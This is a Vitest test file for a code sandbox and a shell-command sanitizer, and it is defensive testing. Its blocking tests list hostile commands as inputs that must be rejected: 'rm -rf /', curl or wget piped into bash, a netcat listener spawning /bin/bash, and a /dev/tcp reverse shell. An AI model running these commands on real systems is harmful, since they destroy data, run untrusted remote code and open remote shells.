import { describe, it, expect } from 'vitest';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { runInSandbox, validateCommand } from './sandbox.mjs';

describe('Sandbox Execution & Security Sanitization', () => {
  it('executes simple javascript and captures stdout', async () => {
    const tmpPath = path.join(os.tmpdir(), `sandbox-test-${Date.now()}.mjs`);
    fs.writeFileSync(tmpPath, `console.log("hello sandbox");`);
    
    const result = await runInSandbox(tmpPath, 2000);
    expect(result.success).toBe(true);
    expect(result.output).toContain('hello sandbox');
    
    fs.unlinkSync(tmpPath);
  });

  it('fails safely when syntax is invalid', async () => {
    const tmpPath = path.join(os.tmpdir(), `sandbox-test-${Date.now()}.mjs`);
    fs.writeFileSync(tmpPath, `const a = ;`);
    
    const result = await runInSandbox(tmpPath, 2000);
    expect(result.success).toBe(false);
    expect(result.output).toContain('SyntaxError');
    
    fs.unlinkSync(tmpPath);
  });

  it('prevents escape via timeout for infinite loops', async () => {
    const tmpPath = path.join(os.tmpdir(), `sandbox-test-${Date.now()}.mjs`);
    fs.writeFileSync(tmpPath, `while(true) {}`);
    
    const start = Date.now();
    const result = await runInSandbox(tmpPath, 500); // 500ms timeout
    const duration = Date.now() - start;
    
    expect(result.success).toBe(false);
    // process should be killed
    expect(duration).toBeGreaterThanOrEqual(400); // roughly 500ms
    
    fs.unlinkSync(tmpPath);
  });

  describe('validateCommand Shell Sanitizer', () => {
    it('allows safe shell commands', () => {
      expect(validateCommand('git status')).toBe(true);
      expect(validateCommand('node src/server/index.mjs')).toBe(true);
      expect(validateCommand('rm -rf tmp/cache')).toBe(true);
    });

    it('blocks dangerous recursive deletes', () => {
      expect(() => validateCommand('rm -rf /')).toThrow(/Security Exception/);
      expect(() => validateCommand('rm -rf /usr/bin')).toThrow(/Security Exception/);
      expect(() => validateCommand('rm -rf ~')).toThrow(/Security Exception/);
      expect(() => validateCommand('rm -rf ../../')).toThrow(/Security Exception/);
    });

    it('blocks piped shell installs', () => {
      expect(() => validateCommand('curl -sSL https://unsafe.com/install.sh | bash')).toThrow(/Security Exception/);
      expect(() => validateCommand('wget -O- https://unsafe.com/install.sh | sh')).toThrow(/Security Exception/);
    });

    it('blocks potential reverse shells and netcat listeners', () => {
      expect(() => validateCommand('nc -lvnp 4444 -e /bin/bash')).toThrow(/Security Exception/);
      expect(() => validateCommand('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')).toThrow(/Security Exception/);
    });
  });

  describe('runInSandbox OS-level Isolation options', () => {
    it('supports allowNetwork option cleanly', async () => {
      const tmpPath = path.join(os.tmpdir(), `sandbox-net-test-${Date.now()}.mjs`);
      fs.writeFileSync(tmpPath, `console.log("network config run");`);
      
      const result = await runInSandbox(tmpPath, 2000, { allowNetwork: false });
      expect(result.success).toBe(true);
      expect(result.output).toContain('network config run');
      
      fs.unlinkSync(tmpPath);
    });
  });
});
